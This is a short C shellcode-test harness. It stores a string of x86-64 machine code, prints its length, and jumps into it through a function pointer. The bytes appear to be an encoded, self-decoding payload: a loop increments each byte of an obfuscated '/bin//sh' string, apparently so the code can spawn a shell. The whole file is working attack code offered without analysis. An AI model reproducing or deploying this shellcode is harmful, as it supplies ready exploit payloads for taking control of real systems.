#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x20\x47\x30\xbf\x4f\x47\xba\x2e\x61\x68\x6d\x2e\x2e\x72\x67\x52\x47\x88\xe6\x4f\x47\x88\xe1\x56\x47\x88\xe5\x47\x82\xbf\x3a\x0e\x04\x48\x8d\x35\xd9\xff\xff\xff\x6a\x20\x59\xfe\x06\x48\xff\xc6\xe2\xf9\xeb\xcd";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
